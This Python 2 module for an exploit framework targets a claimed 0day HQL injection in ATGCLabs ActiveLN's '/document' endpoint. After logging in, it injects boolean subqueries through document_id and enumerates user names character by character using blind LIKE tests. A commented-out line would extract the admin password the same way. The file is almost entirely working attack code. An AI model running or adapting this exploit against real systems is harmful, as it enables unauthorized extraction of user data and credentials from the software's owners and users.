#!/usr/bin/env python

import urllib2
import urllib
from cookielib import CookieJar
from string import printable, punctuation
from collections import OrderedDict
from Sploit import Sploit


INFO = {}
INFO['NAME'] = 'efa_ATGCLabs_ActiveLN_HQLi'
INFO['DESCRIPTION'] = 'ATGCLabs ActiveLN HQLi'
INFO['VENDOR'] = 'https://www.atgclabs.com'
INFO['CVE Name'] = '0day'
INFO['DOWNLOAD_LINK'] = 'https://www.atgclabs.com/products/ln'
INFO['LINKS'] = []
INFO['CHANGELOG'] = '17 Oct 2018.'
INFO['PATH'] = 'Web/'
INFO['NOTES'] = """The vulnerability exists due to failure in the "/document" endpoint to 
properly sanitize user-supplied input in "document_id" variable. Attacker can alter HQL queries.
Authentication is required to exploit this vulnerability.
Tested against ActiveLN 1.0.0.157 on Windows 7 SP1 x64.
"""

OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.0.15'
OPTIONS['PORT'] = 8083
OPTIONS['SSL'] = False
OPTIONS['BASEPATH'] = 'ln'
OPTIONS['USERNAME'] = 'guest'
OPTIONS['PASSWORD'] = 'password'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = self.args.get('PORT', OPTIONS['PORT'])
        self.username = self.args.get('USERNAME', OPTIONS['USERNAME'])
        self.password = self.args.get('PASSWORD', OPTIONS['PASSWORD'])
        self.ssl = self.args.get('SSL', OPTIONS['SSL'])
        self.basepath = self.args.get('BASEPATH', OPTIONS['BASEPATH']).strip('/')

    def make_url(self, path=''):
        proto = 'https' if self.ssl else 'http'
        url = '%s://%s:%s/%s' % (proto, self.host, self.port, '/'.join(ur.replace(' ', '%20') for ur in [self.basepath, path] if ur))
        return url

    def make_query(self, model, field, to_find, is_check=False, where_field=()):
        if not is_check:
            to_find += '%25'
        if where_field:
            url = self.make_url(
                "document?document_id=1 and (select count({field}) from {model} where {where}={where_value} and {field} LIKE '{ch}')>0"
                .format(ch=to_find, field=field, model=model, where=where_field[0], where_value=where_field[1]))
        else:
            url = self.make_url("document?document_id=1 and (select count({field}) from {model} where {field} LIKE '{ch}')>0"
                .format(ch=to_find, field=field, model=model))
        res = self.opener.open(url)
        if not 'This application has malfunctioned' in res.read():
            return to_find


    def execute_query(self, model, field, where_field=()):
        to_test = []
        for ch in printable:
            if ch == '_':
                continue
            try:
                res = self.make_query(model, field, ch, False, where_field)
                if res:
                    to_test.append(ch)
            except Exception as e:
                print e
        print to_test

        found_data = []
        while 1:
            temp = []
            for base in to_test:
                for ch in printable:
                    if ch == '_':
                        continue
                    try:
                        res = self.make_query(model, field, base+ch, False, where_field)
                        if res:
                            temp.append(base+ch)
                            res = self.make_query(model, field, base+ch, True, where_field)
                            if res:
                                self.log('[+] Found: ' + base+ch)
                                found_data.append(base+ch)
                    except Exception as e:
                        print e
                        continue
            to_test = temp
            if len(temp) == 0:
                print found_data
                break

    def run(self):
        #Get options from gui
        self.args()
        cj = CookieJar()
        self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
        url = self.make_url('ccl')
        data = 'username=%s&password=%s' % (self.username, self.password)
        self.log('[*] Trying to login')
        res = self.opener.open(url, data).read()
        if 'Welcome' not in res:
            self.log('[-] Wrong credentials. Try again')
            self.finish(False)
        self.log('[*] Enumerating users')
        self.execute_query('com.atgclabs.pts.model.User', 'name')
        # self.execute_query('com.atgclabs.pts.model.User', 'password', ('user', '\'admin\''))
        self.finish(True)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()